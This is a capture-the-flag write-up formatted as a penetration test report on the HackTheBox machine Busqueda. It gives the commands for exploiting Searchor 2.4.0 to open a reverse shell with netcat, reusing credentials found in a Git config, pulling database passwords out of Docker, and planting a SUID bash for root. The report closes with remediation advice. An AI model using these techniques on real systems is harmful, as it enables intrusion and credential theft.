# HTB Busqueda - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-5-12

---

## 1. Executive Summary

A penetration test was conducted against the Busqueda target system. Multiple vulnerabilities were identified, including arbitrary command execution in Searchor 2.4.0, credential exposure within Git configuration files, and insecure sudo permissions permitting execution of privileged scripts.

Initial access was achieved through exploitation of a vulnerable Searchor 2.4.0 installation allowing arbitrary command execution. Post-exploitation enumeration revealed internal services and exposed credentials within a Git repository configuration file. Privilege escalation to root was achieved through abuse of a sudo-allowed Python script interacting with Docker containers and execution of attacker-controlled code.

The system was fully compromised.

---

## 2. Scope

- **Target:** 10.129.228.217
- **Environment:** HackTheBox Busqueda (Retired Machine)
- **Testing Window:** 2026-5-9 to 2026-5-12
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

### TCP Port Enumeration

Command:

```
nmap -p- -sC -sV 10.129.228.217 -T4 -oA busqueda_tcp
```

Relevant Output:

```
22/tcp open  ssh
80/tcp open  http
```

Interpretation:

The target exposed SSH and HTTP services. The web application became the primary attack surface.

---

## 5. Enumeration

### Host Resolution

The hostname was added locally for proper virtual host resolution.

Command:

```
echo "10.129.228.217 searcher.htb" | sudo tee -a /etc/hosts
```

---

### Directory Enumeration

A Gobuster scan was performed against the web service.

Command:

```
gobuster dir -u http://searcher.htb -w /usr/share/wordlists/dirb/common.txt
```

Relevant Output:

```
/search (Status: 405)
```

Interpretation:

The `/search` endpoint rejected GET requests and appeared to require a different HTTP method.

---

### Application Fingerprinting

The request was modified in Burp Suite Repeater to identify the backend application.

Relevant Output:

```
Searchor 2.4.0
```

Interpretation:

The application disclosed the version `Searchor 2.4.0`, which is vulnerable to arbitrary command execution.

### Vulnerability Research

Public advisories and exploit proof-of-concepts were identified.

References:

```
https://github.com/ArjunSharda/Searchor/security/advisories/GHSA-66m2-493m-crh2

https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
```

Interpretation:

The vulnerability allowed arbitrary operating system command execution through crafted requests.

---

## 6. Initial Access

### Exploit Searchor 2.4.0

A public exploit was used to gain remote command execution and obtain a reverse shell.

Listener:

```
rlwrap nc -lnvp 9001
```

Command:

```
./exploit.sh searcher.htb 10.10.14.29
```

Relevant Output:

```
connect to [10.10.14.29] from (UNKNOWN) [10.129.228.217]
svc
busqueda
```

Verification:

```
whoami
hostname
```

Output:

```
svc
busqueda
```

Interpretation:

A reverse shell was obtained as the low-privileged user `svc`.

### Post-Exploitation Enumeration

Automated enumeration was performed.

Command:

```
linpeas.sh
```

Relevant Findings:

```
gitea.searcher.htb
Internal services
Docker-related services
```

Interpretation:

Enumeration identified an internal Gitea service and Docker-related infrastructure.

### Add Internal Hostname

Command:

```
echo "10.129.228.217 gitea.searcher.htb" | sudo tee -a /etc/hosts
```

---

## 7. Post-Exploitation

### Git Configuration Enumeration

Git-related directories were identified.

Locations:

```
/opt/scripts
/var/www/app
```

The repository configuration file was inspected.

Command:

```
cat /var/www/app/.git/config
```

Relevant Output:

```
http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```

Interpretation:

Valid credentials for user `cody` were exposed within the Git configuration file.

### Gitea Authentication

The recovered credentials were used to authenticate to the Gitea web interface.

Credentials:

```
cody : jh1usoih2bkjaspwe92
```

Interpretation:

Credential reuse provided authenticated access to internal services.

### Sudo Enumeration

Sudo permissions were reviewed.

Command:

```
sudo -l
```

Relevant Output:

```
(ALL) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Interpretation:

The user `svc` could execute the privileged `system-checkup.py` script via sudo with arbitrary arguments.

---

## 8. Privilege Escalation

### Docker Inspection Enumeration

The privileged script exposed Docker inspection functionality.

Command:

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
```

Relevant Output:

```
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

Interpretation:

The script permitted arbitrary Docker inspect formatting operations against containers.

### Extract Container Information

The Gitea container configuration was inspected.

Command:

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea
```

Relevant Output:

```
MYSQL_ROOT_PASSWORD
GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh
```

Interpretation:

Database credentials were extracted from Docker container environment variables.

### Enumerate Container Network

The container network configuration was inspected.

Command:

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' gitea | jq
```

Relevant Output:

```
172.19.0.3
```

Interpretation:

The internal MySQL container IP address was identified.

### MySQL Access

Database access was achieved using recovered credentials.

Command:

```
mysql -u gitea -h 172.19.0.3 -pyuiu1hoiu4i5ho1uh gitea
```

Relevant Output:

```
Welcome to the MySQL monitor.
```

Interpretation:

The recovered credentials successfully authenticated to the internal database.

### Database Enumeration

Command:

```
show databases;
use gitea;
show tables;
select name,passwd from user;
```

Relevant Output:

```
administrator : <hash>
cody : <hash>
```

Interpretation:

Additional credential material was identified, though the password hashes were not directly crackable during testing.

### Malicious Script Creation

A malicious script was created to generate a SUID-enabled bash binary.

Command:

```
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash\nchmod 4777 /tmp/rootbash' > full-checkup.sh
```

Command:

```
chmod +x full-checkup.sh
```

Interpretation:

The payload was prepared to create a persistent privileged shell.

### Execute Full Checkup Functionality

The privileged script executed the attacker-controlled script.

Command:

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Relevant Output:

```
[+] Done!
rootbash
```

Interpretation:

The privileged process successfully executed attacker-controlled code as root.

### Root Shell

Command:

```
/tmp/rootbash -p
```

Verification:

```
whoami
hostname
```

Output:

```
root
busqueda
```

Interpretation:

Privilege escalation to root was successful.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

Command:

```
cat /home/svc/user.txt
```

---

**Root Flag**: *REDACTED*

Command:

```
cat /root/root.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Vulnerable Searchor 2.4.0 Application Allowing Remote Command Execution

**Severity:** Critical

**Description:**
The target web application used a vulnerable version of Searchor affected by arbitrary command execution vulnerabilities.

**Impact:**
Unauthenticated attackers could execute arbitrary operating system commands and gain initial access to the underlying server.

**Recommendation:**
Upgrade Searchor to a patched version and validate all user-controlled input before processing commands.

### **Finding:** Credential Exposure in Git Configuration Files

**Severity:** High

**Description:**
Sensitive credentials were stored in plaintext within Git repository configuration files accessible to low-privileged users.

**Impact:**
Attackers could recover valid credentials and gain access to additional services or accounts.

**Recommendation:**
Remove credentials from repository configuration files and implement secure secret management solutions.

### **Finding:** Insecure Sudo Permissions Allowing Arbitrary Privileged Script Execution

**Severity:** Critical

**Description:**
A user was permitted to execute a privileged Python script through sudo with insufficient input validation and unrestricted arguments.

**Impact:**
Attackers could abuse the script functionality to execute arbitrary commands as root and fully compromise the operating system.

**Recommendation:**
Restrict sudo permissions to specific safe commands and avoid exposing administrative Docker functionality through privileged scripts.

---

## 11. Appendix

Searchor 2.4.0 Arbitrary Command Injection -
[https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)

Searchor Security Advisory -
[https://github.com/ArjunSharda/Searchor/security/advisories/GHSA-66m2-493m-crh2](https://github.com/ArjunSharda/Searchor/security/advisories/GHSA-66m2-493m-crh2)

Docker Inspect Documentation -
[https://docs.docker.com/reference/cli/docker/inspect/](https://docs.docker.com/reference/cli/docker/inspect/)

Docker Formatting Documentation -
[https://docs.docker.com/engine/cli/formatting/](https://docs.docker.com/engine/cli/formatting/)
